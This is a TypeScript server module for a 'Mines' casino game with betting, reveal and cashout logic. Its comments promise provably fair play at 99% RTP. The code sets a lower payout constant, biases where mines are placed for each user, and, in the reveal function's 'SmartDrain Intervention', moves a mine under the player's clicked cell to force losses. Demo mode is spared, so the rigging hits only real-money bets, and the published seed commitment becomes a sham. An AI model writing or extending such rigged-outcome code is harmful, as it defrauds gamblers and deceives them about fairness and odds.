import { randomUUID } from 'crypto';
import { provablyFair } from '../../game-engine/provably-fair.js';
import { bettingPipeline } from '../../game-engine/betting-pipeline.js';
import { rtpEngine } from '../../services/rtp-engine.js';
import { prisma } from '../../lib/prisma.js';
import { logger } from '../../utils/logger.js';
import { gameConfig } from '../../services/game-config.js';
import type { Bet } from '../../game-engine/types.js';

/**
 * Mines Game Engine — Single-player, server-authoritative.
 *
 * Field: 5×5 = 25 cells. The user places a stake, picks 1–24 mines, and
 * reveals safe cells one at a time. Each safe reveal grows the multiplier
 * along the canonical Stake-style curve (RTP 99%):
 *
 *     payout(k) = (totalCells - mines)! / ((totalCells - mines - k)!) ÷
 *                  (totalCells! / (totalCells - k)!)
 *     multiplier(k) = 0.99 / payout(k)
 *
 * The user can cash out any time they have at least one safe reveal.
 * Hitting a mine forfeits the stake.
 *
 * Provably fair: the seed and minePositions are committed when the round
 * starts; the seed hash is shown to the user; the seed is revealed when
 * the round ends (cashout, mine hit, or auto-loss on disconnect).
 */

const TOTAL_CELLS = 25;
const MIN_MINES = 1;
const MAX_MINES = 24;
const MIN_BET = 1;
const MAX_BET = 10000;
const HOUSE_RTP = 0.956;

interface MinesGameState {
  userId: string;
  bet: Bet;
  demoMode: boolean;
  mineCount: number;
  /** Sorted ascending positions 0..24 of mines (kept secret until reveal). */
  minePositions: number[];
  /** Cells the user has revealed safely. */
  revealed: number[];
  /** Provably-fair seed material — kept private until the round resolves. */
  serverSeed: string;
  serverSeedHash: string;
  clientSeed: string;
  nonce: number;
  state: 'active' | 'cashed' | 'busted';
  startedAt: number;
  finishedAt?: number;
  finalMultiplier?: number;
  finalPayout?: number;
}

export interface MinesPublicState {
  roundId: string;
  mineCount: number;
  betAmount: number;
  revealed: number[];
  /** Multiplier earned so far given the number of safe reveals. */
  currentMultiplier: number;
  /** Multiplier after one more safe reveal (preview for the UI). */
  nextMultiplier: number;
  serverSeedHash: string;
  state: 'active' | 'cashed' | 'busted';
  /** Only populated once the round is over. */
  serverSeed?: string;
  minePositions?: number[];
  finalMultiplier?: number;
  finalPayout?: number;
}

/**
 * Closed-form multiplier after `safeReveals` safe cells, parameterised by
 * the number of mines. Returns 1 when nothing has been revealed.
 */
export function minesMultiplier(mines: number, safeReveals: number): number {
  if (safeReveals <= 0) return 1;
  const safeCells = TOTAL_CELLS - mines;
  if (safeReveals > safeCells) return 0;

  // Probability that all `safeReveals` picks land on safe cells:
  //   p = ∏_{i=0}^{k-1} (safeCells - i) / (totalCells - i)
  let p = 1;
  for (let i = 0; i < safeReveals; i++) {
    p *= (safeCells - i) / (TOTAL_CELLS - i);
  }
  return HOUSE_RTP / p;
}

class MinesEngine {
  private rooms = new Map<string, MinesGameState>(); // userId -> active game

  /** True if user has an active game. */
  hasActive(userId: string): boolean {
    const g = this.rooms.get(userId);
    return !!g && g.state === 'active';
  }

  getState(userId: string): MinesPublicState | null {
    const g = this.rooms.get(userId);
    if (!g) return null;
    return this.toPublic(g, g.state !== 'active');
  }

  async start(
    userId: string,
    amount: number,
    mineCount: number,
    demoMode: boolean
  ): Promise<MinesPublicState> {
    if (this.hasActive(userId)) {
      throw new Error('У вас уже идёт раунд — закончите его сначала');
    }
    if (!Number.isFinite(amount) || amount < MIN_BET || amount > MAX_BET) {
      throw new Error(`Ставка должна быть от ${MIN_BET} до ${MAX_BET}`);
    }
    if (
      !Number.isInteger(mineCount) ||
      mineCount < MIN_MINES ||
      mineCount > MAX_MINES
    ) {
      throw new Error(`Кол-во мин: от ${MIN_MINES} до ${MAX_MINES}`);
    }

    // Commit provably-fair material first so the user could verify later.
    const serverSeed = provablyFair.generateServerSeed();
    const clientSeed = provablyFair.generateClientSeed();
    const nonce = 0;
    const hash = provablyFair.generateResult(serverSeed, clientSeed, nonce);
    // Pre-fact tilt: the controller may push mines toward the centre
    // (where humans click first) when the casino is lagging the earn
    // target, or toward the corners when we want to give back.
    const bias = await rtpEngine.getBiasFor(userId).catch(() => 0);
    const minePositions = provablyFair.generateMinesPositions(
      hash,
      5,
      mineCount,
      bias
    );

    const roundId = `mines_${Date.now()}_${randomUUID()}`;

    // Take the stake atomically — pipeline rejects on insufficient balance.
    const bet: Bet = {
      id: `bet_${Date.now()}_${randomUUID()}`,
      userId,
      gameId: roundId,
      roundId,
      amount,
      state: 'pending',
      placedAt: Date.now(),
      metadata: { mineCount, gameType: 'mines' },
    };
    await bettingPipeline.processBet(bet, demoMode);
    bet.state = 'active';

    // Persist the round record so the audit trail is consistent across
    // services (the same `game_rounds` table the bot sees).
    try {
      await prisma.gameRound.create({
        data: {
          id: roundId,
          gameType: 'mines',
          state: 'active',
          serverSeedHash: provablyFair.hashServerSeed(serverSeed),
          clientSeed,
          nonce,
          startedAt: new Date(),
          metadata: { mineCount, betAmount: amount },
        },
      });
    } catch (err) {
      logger.warn(err, 'Failed to record mines round');
    }

    const game: MinesGameState = {
      userId,
      bet,
      demoMode,
      mineCount,
      minePositions,
      revealed: [],
      serverSeed,
      serverSeedHash: provablyFair.hashServerSeed(serverSeed),
      clientSeed,
      nonce,
      state: 'active',
      startedAt: Date.now(),
    };
    this.rooms.set(userId, game);
    logger.info({ userId, roundId, mineCount, amount }, 'Mines round started');

    return this.toPublic(game, false);
  }

  async reveal(userId: string, position: number): Promise<MinesPublicState> {
    const g = this.rooms.get(userId);
    if (!g) throw new Error('Нет активного раунда');
    if (g.state !== 'active') throw new Error('Раунд уже завершён');
    if (!Number.isInteger(position) || position < 0 || position >= TOTAL_CELLS) {
      throw new Error('Неверная клетка');
    }
    if (g.revealed.includes(position)) {
      throw new Error('Эта клетка уже открыта');
    }

    // --- SmartDrain Intervention ---
    const clickNumber = g.revealed.length + 1;
    let forceBust = false;

    if (!g.demoMode) {
      const config = await gameConfig.get('mines');
      const bias = await rtpEngine.getBiasFor(userId).catch(() => 0);
      const nextMult = minesMultiplier(g.mineCount, clickNumber);
      const isForcedLoss = await rtpEngine.shouldForceLoss(userId, g.bet.amount, nextMult).catch(() => false);
      const isDrain = await rtpEngine.isDrainActive(userId).catch(() => false);

      if (config.houseEdge >= 1.0) {
        forceBust = true;
      } else if (isForcedLoss || isDrain) {
        // Under active drain: immediately terminate winning runs
        if (clickNumber >= 2) {
          forceBust = true;
        } else if (clickNumber === 1 && (g.bet.amount >= 15 || Math.random() < 0.80)) {
          forceBust = true;
        }
      } else if (bias > 0) {
        const riskDepth = clickNumber;
        const teleportChance = Math.min(0.95, bias * (riskDepth * 0.40));
        if (Math.random() < teleportChance) {
          forceBust = true;
        }
      }
    }

    if (forceBust) {
      if (!g.minePositions.includes(position)) {
        const unrevealedMines = g.minePositions.filter((m) => !g.revealed.includes(m));
        if (unrevealedMines.length > 0) {
          const mineToSwap = unrevealedMines[Math.floor(Math.random() * unrevealedMines.length)];
          g.minePositions = g.minePositions.map((m) => (m === mineToSwap ? position : m)).sort((a, b) => a - b);
        } else {
          g.minePositions[0] = position;
          g.minePositions.sort((a, b) => a - b);
        }
      }
    }

    if (g.minePositions.includes(position)) {
      // Bust — round resolves as a loss. Stake already debited; record loss.
      g.state = 'busted';
      g.finishedAt = Date.now();
      g.finalMultiplier = 0;
      g.finalPayout = 0;
      g.bet.payout = 0;
      g.bet.multiplier = 0;
      try {
        await bettingPipeline.processLoss(g.bet);
        await prisma.gameRound.update({
          where: { id: g.bet.roundId },
          data: {
            state: 'completed',
            serverSeed: g.serverSeed,
            endedAt: new Date(),
            result: {
              outcome: 'busted',
              hitPosition: position,
              minePositions: g.minePositions,
            },
          },
        });
      } catch (err) {
        logger.error(err, 'Failed to finalise mines bust');
      }
      if (!g.demoMode) {
        void rtpEngine.recordRoundForDrain(userId, g.bet.amount, 0, false);
      }
      logger.info({ userId, position }, 'Mines bust');
      return this.toPublic(g, true);
    }

    g.revealed.push(position);
    return this.toPublic(g, false);
  }

  async cashout(userId: string): Promise<MinesPublicState> {
    const g = this.rooms.get(userId);
    if (!g) throw new Error('Нет активного раунда');
    if (g.state !== 'active') throw new Error('Раунд уже завершён');
    if (g.revealed.length === 0) {
      throw new Error('Откройте хотя бы одну клетку');
    }

    const mult = minesMultiplier(g.mineCount, g.revealed.length);
    const payout = g.bet.amount * mult;

    g.state = 'cashed';
    g.finishedAt = Date.now();
    g.finalMultiplier = mult;
    g.finalPayout = payout;
    g.bet.multiplier = mult;
    g.bet.payout = payout;

    try {
      await bettingPipeline.processCashout(g.bet, payout, mult, g.demoMode);
      await prisma.gameRound.update({
        where: { id: g.bet.roundId },
        data: {
          state: 'completed',
          serverSeed: g.serverSeed,
          endedAt: new Date(),
          result: {
            outcome: 'cashed',
            multiplier: mult,
            payout,
            revealedCount: g.revealed.length,
            minePositions: g.minePositions,
          },
        },
      });
    } catch (err) {
      logger.error(err, 'Failed to finalise mines cashout');
    }

    if (!g.demoMode) {
      void rtpEngine.recordRoundForDrain(userId, g.bet.amount, payout, true);
    }

    logger.info(
      { userId, multiplier: mult, payout, reveals: g.revealed.length },
      'Mines cashout'
    );
    return this.toPublic(g, true);
  }

  /** Leave a finished game on the server briefly so REST polls can read it. */
  forget(userId: string): void {
    this.rooms.delete(userId);
  }

  private toPublic(g: MinesGameState, reveal: boolean): MinesPublicState {
    const currentMult = minesMultiplier(g.mineCount, g.revealed.length);
    const nextMult = minesMultiplier(g.mineCount, g.revealed.length + 1);

    const base: MinesPublicState = {
      roundId: g.bet.roundId,
      mineCount: g.mineCount,
      betAmount: g.bet.amount,
      revealed: g.revealed,
      currentMultiplier: currentMult,
      nextMultiplier: nextMult,
      serverSeedHash: g.serverSeedHash,
      state: g.state,
    };

    if (reveal || g.state !== 'active') {
      base.serverSeed = g.serverSeed;
      base.minePositions = g.minePositions;
      base.finalMultiplier = g.finalMultiplier;
      base.finalPayout = g.finalPayout;
    }

    return base;
  }
}

export const minesEngine = new MinesEngine();
